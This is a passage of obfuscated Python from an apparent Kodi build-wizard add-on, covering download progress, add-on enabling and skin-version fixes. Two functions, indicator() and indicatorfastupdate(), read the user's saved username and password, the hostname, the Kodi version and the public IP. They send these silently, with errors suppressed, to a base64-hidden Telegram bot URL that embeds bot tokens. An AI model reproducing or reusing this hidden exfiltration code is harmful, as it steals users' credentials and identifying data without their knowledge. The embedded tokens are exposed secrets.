            os .remove (O00000O0O0OOOO0OO )#line:3458
           except :#line:3459
            pass #line:3460
           break #line:3461
        O000O00OO00OO00O0 =float (O00000OO00OOO000O )/O0O00O0O00O0OOO0O #line:3462
        O000O00OO00OO00O0 =round (O000O00OO00OO00O0 *100 ,2 )#line:3463
        OO0O0O000OO0000OO =O00000OO00OOO000O /(1024 *1024 )#line:3464
        OOOOOOOOO0O000O0O =O0O00O0O00O0OOO0O /(1024 *1024 )#line:3465
        O0000OO0OO000000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0O000OO0000OO ,'teal',OOOOOOOOO0O000O0O )#line:3466
        if (time .time ()-OOO00O0O0OOO0OOOO )>0 :#line:3467
          OOOOOOOO0OO0OOOOO =O00000OO00OOO000O /(time .time ()-OOO00O0O0OOO0OOOO )#line:3468
          OOOOOOOO0OO0OOOOO =OOOOOOOO0OO0OOOOO /1024 #line:3469
        else :#line:3470
         OOOOOOOO0OO0OOOOO =0 #line:3471
        OOO0O0O0OOO0O000O ='KB'#line:3472
        if OOOOOOOO0OO0OOOOO >=1024 :#line:3473
           OOOOOOOO0OO0OOOOO =OOOOOOOO0OO0OOOOO /1024 #line:3474
           OOO0O0O0OOO0O000O ='MB'#line:3475
        if OOOOOOOO0OO0OOOOO >0 and not O000O00OO00OO00O0 ==100 :#line:3476
            O00O0OOO0O0OOOO00 =(O0O00O0O00O0OOO0O -O00000OO00OOO000O )/OOOOOOOO0OO0OOOOO #line:3477
        else :#line:3478
            O00O0OOO0O0OOOO00 =0 #line:3479
        O0OOOOO00OOOO00O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOOOO0OO0OOOOO ,OOO0O0O0OOO0O000O )#line:3480
        O000000O000OO000O .update (int (O000O00OO00OO00O0 ),"Downloading "+name ,O0000OO0OO000000O ,O0OOOOO00OOOO00O0 )#line:3482
  OOO00O0O000OOO00O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3485
  OOO000O0OO00OOOO0 .close ()#line:3487
  extract (O00000O0O0OOOO0OO ,OOO00O0O000OOO00O ,O000000O000OO000O )#line:3489
  if os .path .exists (OOO00O0O000OOO00O +'/scakemyer-script.quasar.burst'):#line:3490
    if os .path .exists (OOO00O0O000OOO00O +'/script.quasar.burst'):#line:3491
     shutil .rmtree (OOO00O0O000OOO00O +'/script.quasar.burst',ignore_errors =False )#line:3492
    os .rename (OOO00O0O000OOO00O +'/scakemyer-script.quasar.burst',OOO00O0O000OOO00O +'/script.quasar.burst')#line:3493
  if os .path .exists (OOO00O0O000OOO00O +'/plugin.video.kmediatorrent-master'):#line:3495
    if os .path .exists (OOO00O0O000OOO00O +'/plugin.video.kmediatorrent'):#line:3496
     shutil .rmtree (OOO00O0O000OOO00O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3497
    os .rename (OOO00O0O000OOO00O +'/plugin.video.kmediatorrent-master',OOO00O0O000OOO00O +'/plugin.video.kmediatorrent')#line:3498
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3499
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3500
  try :#line:3501
    os .remove (O00000O0O0OOOO0OO )#line:3502
  except :#line:3503
    pass #line:3504
  O000000O000OO000O .close ()#line:3505
def dis_or_enable_addon (OOOO00O00O0O000OO ,OO0OO0OO00O00000O ,enable ="true"):#line:3506
    import json #line:3507
    O0O00O0O0O00OO000 ='"%s"'%OOOO00O00O0O000OO #line:3508
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO00O00O0O000OO )and enable =="true":#line:3509
        logging .warning ('already Enabled')#line:3510
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOO00O00O0O000OO )#line:3511
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO00O00O0O000OO )and enable =="false":#line:3512
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOO00O00O0O000OO )#line:3513
    else :#line:3514
        O0OO0000OOOO00OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O00O0O0O00OO000 ,enable )#line:3515
        O00O0OO0OO0OO0O0O =xbmc .executeJSONRPC (O0OO0000OOOO00OO0 )#line:3516
        OOOO0OOO000O000O0 =json .loads (O00O0OO0OO0OO0O0O )#line:3517
        if enable =="true":#line:3518
            xbmc .log ("### Enabled %s, response = %s"%(OOOO00O00O0O000OO ,OOOO0OOO000O000O0 ))#line:3519
        else :#line:3520
            xbmc .log ("### Disabled %s, response = %s"%(OOOO00O00O0O000OO ,OOOO0OOO000O000O0 ))#line:3521
    if OO0OO0OO00O00000O =='auto':#line:3522
     return True #line:3523
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3524
def chunk_report (OOO00O0O0000000O0 ,OOOOOO0O00OO0000O ,O0O000O00OOO0OOOO ):#line:3525
   OO0OO0O00OOO00O00 =float (OOO00O0O0000000O0 )/O0O000O00OOO0OOOO #line:3526
   OO0OO0O00OOO00O00 =round (OO0OO0O00OOO00O00 *100 ,2 )#line:3527
   if OOO00O0O0000000O0 >=O0O000O00OOO0OOOO :#line:3529
      sys .stdout .write ('\n')#line:3530
def chunk_read (OO0OO00O00OOO0O00 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3532
   import time #line:3533
   OO0O000O0OOO0O00O =int (filesize )*1000000 #line:3534
   OO0O000OOO0O000OO =0 #line:3536
   OOOOO0O00OO00OO00 =time .time ()#line:3537
   OO000OOO00OO00OOO =0 #line:3538
   logging .warning ('Downloading')#line:3540
   with open (destination ,"wb")as O000000OO0000OOOO :#line:3541
    while 1 :#line:3542
      OOOO0OO000OO0OOO0 =time .time ()-OOOOO0O00OO00OO00 #line:3543
      O0OOOOO0OOOO000O0 =int (OO000OOO00OO00OOO *chunk_size )#line:3544
      OOO00O0OOO0O0OO00 =OO0OO00O00OOO0O00 .read (chunk_size )#line:3545
      O000000OO0000OOOO .write (OOO00O0OOO0O0OO00 )#line:3546
      O000000OO0000OOOO .flush ()#line:3547
      OO0O000OOO0O000OO +=len (OOO00O0OOO0O0OO00 )#line:3548
      O00OOO0O0000000OO =float (OO0O000OOO0O000OO )/OO0O000O0OOO0O00O #line:3549
      O00OOO0O0000000OO =round (O00OOO0O0000000OO *100 ,2 )#line:3550
      if int (OOOO0OO000OO0OOO0 )>0 :#line:3551
        O00OO00000O0000O0 =int (O0OOOOO0OOOO000O0 /(1024 *OOOO0OO000OO0OOO0 ))#line:3552
      else :#line:3553
         O00OO00000O0000O0 =0 #line:3554
      if O00OO00000O0000O0 >1024 and not O00OOO0O0000000OO ==100 :#line:3555
          O0OO0000O000OO000 =int (((OO0O000O0OOO0O00O -O0OOOOO0OOOO000O0 )/1024 )/(O00OO00000O0000O0 ))#line:3556
      else :#line:3557
          O0OO0000O000OO000 =0 #line:3558
      if O0OO0000O000OO000 <0 :#line:3559
        O0OO0000O000OO000 =0 #line:3560
      dp .update (int (O00OOO0O0000000OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00OOO0O0000000OO ,O0OOOOO0OOOO000O0 /(1024 *1024 ),OO0O000O0OOO0O00O /(1000 *1000 ),O00OO00000O0000O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OO0000O000OO000 ,60 ))#line:3561
      if dp .iscanceled ():#line:3562
         dp .close ()#line:3563
         break #line:3564
      if not OOO00O0OOO0O0OO00 :#line:3565
         break #line:3566
      if report_hook :#line:3568
         report_hook (OO0O000OOO0O000OO ,chunk_size ,OO0O000O0OOO0O00O )#line:3569
      OO000OOO00OO00OOO +=1 #line:3570
   logging .warning ('END Downloading')#line:3571
   return OO0O000OOO0O000OO #line:3572
def googledrive_download (O0OOO0O0OO00000O0 ,O0O0OO0000OO0O0O0 ,OO0OOO0O00OOOOO0O ,O0000000OO0OOO000 ):#line:3574
    O00O0OO0O000OOOOO =[]#line:3578
    OO0OOOO00O00O0OOO =O0OOO0O0OO00000O0 .split ('=')#line:3579
    O0OOO0O0OO00000O0 =OO0OOOO00O00O0OOO [len (OO0OOOO00O00O0OOO )-1 ]#line:3580
    def O00O000O0OO0OO0O0 (O0O000O000000OO00 ):#line:3582
        for O000OO0O0O0OOO000 in O0O000O000000OO00 :#line:3584
            logging .warning ('cookie.name')#line:3585
            logging .warning (O000OO0O0O0OOO000 .name )#line:3586
            O00OO0O000000000O =O000OO0O0O0OOO000 .value #line:3587
            if 'download_warning'in O000OO0O0O0OOO000 .name :#line:3588
                logging .warning (O000OO0O0O0OOO000 .value )#line:3589
                logging .warning ('cookie.value')#line:3590
                return O000OO0O0O0OOO000 .value #line:3591
            return O00OO0O000000000O #line:3592
        return None #line:3594
    def O0O0O0O0000OOO0OO (O000O00O0000000OO ,OOOO0O0000O0OOOO0 ):#line:3596
        OOO00O000O0OO0OO0 =32768 #line:3598
        OO0O0O000OO00O0O0 =time .time ()#line:3599
        with open (OOOO0O0000O0OOOO0 ,"wb")as OO0OO00OOOOO0000O :#line:3601
            OO000O00O0O000000 =1 #line:3602
            OOOOO0000OOOO00OO =32768 #line:3603
            try :#line:3604
                O0O00OOO0OOO00O0O =int (O000O00O0000000OO .headers .get ('content-length'))#line:3605
                print ('file total size :',O0O00OOO0OOO00O0O )#line:3606
            except TypeError :#line:3607
                print ('using dummy length !!!')#line:3608
                O0O00OOO0OOO00O0O =int (O0000000OO0OOO000 )*1000000 #line:3609
            for O0O0OOO0OO0OOOOOO in O000O00O0000000OO .iter_content (OOO00O000O0OO0OO0 ):#line:3610
                if O0O0OOO0OO0OOOOOO :#line:3611
                    OO0OO00OOOOO0000O .write (O0O0OOO0OO0OOOOOO )#line:3612
                    OO0OO00OOOOO0000O .flush ()#line:3613
                    OOO0OOO00000OO000 =time .time ()-OO0O0O000OO00O0O0 #line:3614
                    OOO0OOOO00000OOO0 =int (OO000O00O0O000000 *OOOOO0000OOOO00OO )#line:3615
                    if OOO0OOO00000OO000 ==0 :#line:3616
                        OOO0OOO00000OO000 =0.1 #line:3617
                    O0O0O0OOO0O00OO0O =int (OOO0OOOO00000OOO0 /(1024 *OOO0OOO00000OO000 ))#line:3618
                    O0O0000O000O00O0O =int (OO000O00O0O000000 *OOOOO0000OOOO00OO *100 /O0O00OOO0OOO00O0O )#line:3619
                    if O0O0O0OOO0O00OO0O >1024 and not O0O0000O000O00O0O ==100 :#line:3620
                      OOO0000O0OOOO0O0O =int (((O0O00OOO0OOO00O0O -OOO0OOOO00000OOO0 )/1024 )/(O0O0O0OOO0O00OO0O ))#line:3621
                    else :#line:3622
                      OOO0000O0OOOO0O0O =0 #line:3623
                    OO0OOO0O00OOOOO0O .update (int (O0O0000O000O00O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0000O000O00O0O ,OOO0OOOO00000OOO0 /(1024 *1024 ),O0O00OOO0OOO00O0O /(1000 *1000 ),O0O0O0OOO0O00OO0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO0000O0OOOO0O0O ,60 ))#line:3625
                    OO000O00O0O000000 +=1 #line:3626
                    if OO0OOO0O00OOOOO0O .iscanceled ():#line:3627
                     OO0OOO0O00OOOOO0O .close ()#line:3628
                     break #line:3629
    OOOO00000OOOOO0OO ="https://docs.google.com/uc?export=download"#line:3630
    import urllib2 #line:3635
    import cookielib #line:3636
    from cookielib import CookieJar #line:3638
    O0O000O0OO0O00000 =CookieJar ()#line:3640
    O00O0O00OOOO00O0O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O000O0OO0O00000 ))#line:3641
    OO0OO0O00000000OO ={'id':O0OOO0O0OO00000O0 }#line:3643
    OOOOOOO0O0000O00O =urllib .urlencode (OO0OO0O00000000OO )#line:3644
    logging .warning (OOOO00000OOOOO0OO +'&'+OOOOOOO0O0000O00O )#line:3645
    O00O00000O0O0OO0O =O00O0O00OOOO00O0O .open (OOOO00000OOOOO0OO +'&'+OOOOOOO0O0000O00O )#line:3646
    OO0O0OO00O0OO0OO0 =O00O00000O0O0OO0O .read ()#line:3647
    for O0O0O0OOO0OOO0O00 in O0O000O0OO0O00000 :#line:3649
         logging .warning (O0O0O0OOO0OOO0O00 )#line:3650
    O0O0O0O000OO000O0 =O00O000O0OO0OO0O0 (O0O000O0OO0O00000 )#line:3651
    logging .warning (O0O0O0O000OO000O0 )#line:3652
    if O0O0O0O000OO000O0 :#line:3653
        OO0OO0000O00000OO ={'id':O0OOO0O0OO00000O0 ,'confirm':O0O0O0O000OO000O0 }#line:3654
        O0OO0O00000O0O00O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3655
        OOOOOOO0O0000O00O =urllib .urlencode (OO0OO0000O00000OO )#line:3656
        O00O00000O0O0OO0O =O00O0O00OOOO00O0O .open (OOOO00000OOOOO0OO +'&'+OOOOOOO0O0000O00O )#line:3657
        chunk_read (O00O00000O0O0OO0O ,report_hook =chunk_report ,dp =OO0OOO0O00OOOOO0O ,destination =O0O0OO0000OO0O0O0 ,filesize =O0000000OO0OOO000 )#line:3658
    return (O00O0OO0O000OOOOO )#line:3662
def kodi17Fix ():#line:3663
	O0OOO0OOOOOO0000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3664
	OOO0OOO0OO00OOO00 =[]#line:3665
	for OOOOOOOO0OOOO0O0O in sorted (O0OOO0OOOOOO0000O ,key =lambda O00OO0OO000O0000O :O00OO0OO000O0000O ):#line:3666
		O0O0O0O0OO000O0OO =os .path .join (OOOOOOOO0OOOO0O0O ,'addon.xml')#line:3667
		if os .path .exists (O0O0O0O0OO000O0OO ):#line:3668
			O00000O0OO0OOO00O =OOOOOOOO0OOOO0O0O .replace (ADDONS ,'')[1 :-1 ]#line:3669
			O0OOO000OOOO0O0OO =open (O0O0O0O0OO000O0OO )#line:3670
			OO0O00OO0OO00OOOO =O0OOO000OOOO0O0OO .read ()#line:3671
			OO0OOOO00O0O00O00 =parseDOM (OO0O00OO0OO00OOOO ,'addon',ret ='id')#line:3672
			O0OOO000OOOO0O0OO .close ()#line:3673
			try :#line:3674
				OOO0O0OOO0000O0O0 =xbmcaddon .Addon (id =OO0OOOO00O0O00O00 [0 ])#line:3675
			except :#line:3676
				try :#line:3677
					log ("%s was disabled"%OO0OOOO00O0O00O00 [0 ],xbmc .LOGDEBUG )#line:3678
					OOO0OOO0OO00OOO00 .append (OO0OOOO00O0O00O00 [0 ])#line:3679
				except :#line:3680
					try :#line:3681
						log ("%s was disabled"%O00000O0OO0OOO00O ,xbmc .LOGDEBUG )#line:3682
						OOO0OOO0OO00OOO00 .append (O00000O0OO0OOO00O )#line:3683
					except :#line:3684
						if len (OO0OOOO00O0O00O00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00000O0OO0OOO00O ,xbmc .LOGERROR )#line:3685
						else :log ("Unabled to enable: %s"%OOOOOOOO0OOOO0O0O ,xbmc .LOGERROR )#line:3686
	if len (OOO0OOO0OO00OOO00 )>0 :#line:3687
		OOO0000OO000O0OO0 =0 #line:3688
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3689
		for OO000O0O00O00OOOO in OOO0OOO0OO00OOO00 :#line:3690
			OOO0000OO000O0OO0 +=1 #line:3691
			O00OOOO00OOO0O0O0 =int (percentage (OOO0000OO000O0OO0 ,len (OOO0OOO0OO00OOO00 )))#line:3692
			DP .update (O00OOOO00OOO0O0O0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O0O00O00OOOO ))#line:3693
			addonDatabase (OO000O0O00O00OOOO ,1 )#line:3694
			if DP .iscanceled ():break #line:3695
		if DP .iscanceled ():#line:3696
			DP .close ()#line:3697
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3698
			sys .exit ()#line:3699
		DP .close ()#line:3700
	forceUpdate ()#line:3701
def indicator ():#line:3703
       try :#line:3704
          import json #line:3705
          wiz .log ('FRESH MESSAGE')#line:3706
          OO00O0000OO00O0O0 =(ADDON .getSetting ("user"))#line:3707
          OOOO00O00O0O00O0O =(ADDON .getSetting ("pass"))#line:3708
          O00OO0O0O000OOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3709
          O0O00OO00000OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3710
          O00O00OOOOOO0O0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3711
          OO000O0O00O00OOO0 =str (json .loads (O00O00OOOOOO0O0O0 )['ip'])#line:3712
          O0O0000OO0000O0OO =OO00O0000OO00O0O0 #line:3713
          O0OOOO00OOO0OO0OO =OOOO00O00O0O00O0O #line:3714
          import socket #line:3715
          O00O00OOOOOO0O0O0 =urllib2 .urlopen (O0O00OO00000OO000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0000OO0000O0OO +' - '+O0OOOO00OOO0OO0OO +' - '+O00OO0O0O000OOOOO +' - '+OO000O0O00O00OOO0 ).readlines ()#line:3716
       except :pass #line:3718
def indicatorfastupdate ():#line:3720
       try :#line:3721
          import json #line:3722
          wiz .log ('FRESH MESSAGE')#line:3723
          O00O0O0O00OOO0OOO =(ADDON .getSetting ("user"))#line:3724
          O0O000OOOOOO00000 =(ADDON .getSetting ("pass"))#line:3725
          OO00O000OO00O0O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3726
          O0O000OOOO0O0O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3728
          O00OO000O0O0OOO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3729
          O0OOO00OO0O0O000O =str (json .loads (O00OO000O0O0OOO00 )['ip'])#line:3730
          OOOO00O00000OOOO0 =O00O0O0O00OOO0OOO #line:3731
          O0O0OOO0O0O0O0000 =O0O000OOOOOO00000 #line:3732
          import socket #line:3734
          O00OO000O0O0OOO00 =urllib2 .urlopen (O0O000OOOO0O0O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO00O00000OOOO0 +' - '+O0O0OOO0O0O0O0000 +' - '+OO00O000OO00O0O00 +' - '+O0OOO00OO0O0O000O ).readlines ()#line:3735
       except :pass #line:3737
def skinfix18 ():#line:3739
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3740
		OO0O0O0OOO00O0OO0 =wiz .workingURL (SKINID18DDONXML )#line:3741
		if OO0O0O0OOO00O0OO0 ==True :#line:3742
			O00O0OOO00000000O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3743
			if len (O00O0OOO00000000O )>0 :#line:3744
				OOO0OOO0OOOOOOOO0 ='%s-%s.zip'%(SKINID18 ,O00O0OOO00000000O [0 ])#line:3745
				OOOOO000O0OOO00O0 =wiz .workingURL (SKIN18ZIPURL +OOO0OOO0OOOOOOOO0 )#line:3746
				if OOOOO000O0OOO00O0 ==True :#line:3747
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3748
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3749
					OO000O00O0O0OOOO0 =os .path .join (PACKAGES ,OOO0OOO0OOOOOOOO0 )#line:3750
					try :os .remove (OO000O00O0O0OOOO0 )#line:3751
					except :pass #line:3752
					downloader .download (SKIN18ZIPURL +OOO0OOO0OOOOOOOO0 ,OO000O00O0O0OOOO0 ,DP )#line:3753
					extract .all (OO000O00O0O0OOOO0 ,HOME ,DP )#line:3754
					try :#line:3755
						OOO00O0OO00OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3756
						OO0000O00OO0O0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3757
						os .rename (OOO00O0OO00OOO0O0 ,OO0000O00OO0O0000 )#line:3758
					except :#line:3759
						pass #line:3760
					try :#line:3761
						OO0OO000OO0O00OO0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO00OO00O0O0O0OOO =OO0OO000OO0O00OO0 .read ();OO0OO000OO0O00OO0 .close ()#line:3762
						O0OOOO000OO0OOOO0 =wiz .parseDOM (OO00OO00O0O0O0OOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3763
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO000OO0OOOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3764
					except :#line:3765
						pass #line:3766
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3767
					DP .close ()#line:3768
					xbmc .sleep (500 )#line:3769
					wiz .forceUpdate (True )#line:3770
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3771
				else :#line:3772
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3773
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOO000O0OOO00O0 ,xbmc .LOGERROR )#line:3774
			else :#line:3775
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3776
		else :#line:3777
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3778
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3779
def skinfix17 ():#line:3780
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3781
		OO00000O00000OO0O =wiz .workingURL (SKINID17DDONXML )#line:3782
		if OO00000O00000OO0O ==True :#line:3783
			O0OO0O00OO0OOO0O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3784
			if len (O0OO0O00OO0OOO0O0 )>0 :#line:3785
				OOO0000OO0O000000 ='%s-%s.zip'%(SKINID17 ,O0OO0O00OO0OOO0O0 [0 ])#line:3786
				O0OOO0OOO00O0O0OO =wiz .workingURL (SKIN17ZIPURL +OOO0000OO0O000000 )#line:3787
				if O0OOO0OOO00O0O0OO ==True :#line:3788
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3789
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3790
					OO000OOO000O0OOO0 =os .path .join (PACKAGES ,OOO0000OO0O000000 )#line:3791
					try :os .remove (OO000OOO000O0OOO0 )#line:3792
					except :pass #line:3793
					downloader .download (SKIN17ZIPURL +OOO0000OO0O000000 ,OO000OOO000O0OOO0 ,DP )#line:3794
					extract .all (OO000OOO000O0OOO0 ,HOME ,DP )#line:3795
					try :#line:3796
						OOOO00000OO0O000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3797
						O000O0O000OO0O0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3798
						os .rename (OOOO00000OO0O000O ,O000O0O000OO0O0O0 )#line:3799
					except :#line:3800
						pass #line:3801
					try :#line:3802
						O0OO000OOO000O0O0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O0O00OOO00O0O0O =O0OO000OOO000O0O0 .read ();O0OO000OOO000O0O0 .close ()#line:3803
						OO00000OO0000OO00 =wiz .parseDOM (O0O0O00OOO00O0O0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3804
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00000OO0000OO00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3805
					except :#line:3806
						pass #line:3807
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3808
					DP .close ()#line:3809
					xbmc .sleep (500 )#line:3810
					wiz .forceUpdate (True )#line:3811
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3812
				else :#line:3813
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3814
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OOO0OOO00O0O0OO ,xbmc .LOGERROR )#line:3815
			else :#line:3816
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3817
		else :#line:3818
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3819
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3820
def fix17update ():#line:3821
	if KODIV >=17 and KODIV <18 :#line:3822
		wiz .kodi17Fix ()#line:3823
		xbmc .sleep (4000 )#line:3824
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3825
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3826
		fixfont ()#line:3827
		OOO000O0OO0O0O00O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3828
		try :#line:3830
			O0OO000OOO0OO0O00 =open (OOO000O0OO0O0O00O ,'r')#line:3831
			OOO000O0O0000O00O =O0OO000OOO0OO0O00 .read ()#line:3832
			O0OO000OOO0OO0O00 .close ()#line:3833
			O000OOOO0O0OO0OOO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3834
			OOO00O0000000OO0O =re .compile (O000OOOO0O0OO0OOO ).findall (OOO000O0O0000O00O )[0 ]#line:3835
			O0OO000OOO0OO0O00 =open (OOO000O0OO0O0O00O ,'w')#line:3836
			O0OO000OOO0OO0O00 .write (OOO000O0O0000O00O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOO00O0000000OO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3837
			O0OO000OOO0OO0O00 .close ()#line:3838
		except :#line:3839
				pass #line:3840
		wiz .kodi17Fix ()#line:3841
		OOO000O0OO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3842
		try :#line:3843
			O0OO000OOO0OO0O00 =open (OOO000O0OO0O0O00O ,'r')#line:3844
			OOO000O0O0000O00O =O0OO000OOO0OO0O00 .read ()#line:3845
			O0OO000OOO0OO0O00 .close ()#line:3846
			O000OOOO0O0OO0OOO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3847
			OOO00O0000000OO0O =re .compile (O000OOOO0O0OO0OOO ).findall (OOO000O0O0000O00O )[0 ]#line:3848
			O0OO000OOO0OO0O00 =open (OOO000O0OO0O0O00O ,'w')#line:3849
			O0OO000OOO0OO0O00 .write (OOO000O0O0000O00O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOO00O0000000OO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3850
			O0OO000OOO0OO0O00 .close ()#line:3851
		except :#line:3852
				pass #line:3853
		swapSkins ('skin.Premium.mod')#line:3854
def fix18update ():#line:3856
	if KODIV >=18 :#line:3857
		xbmc .sleep (4000 )#line:3858
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3859
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3860
		fixfont ()#line:3861
		O0OO0OO00O0OOOOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3862
		try :#line:3863
			OO0OOO0OOOOO00O0O =open (O0OO0OO00O0OOOOO0 ,'r')#line:3864
			OOO000OO000O0OOO0 =OO0OOO0OOOOO00O0O .read ()#line:3865
			OO0OOO0OOOOO00O0O .close ()#line:3866
			OO000OOO0O0O00O00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3867
			O00OOOO0OO00O0OOO =re .compile (OO000OOO0O0O00O00 ).findall (OOO000OO000O0OOO0 )[0 ]#line:3868
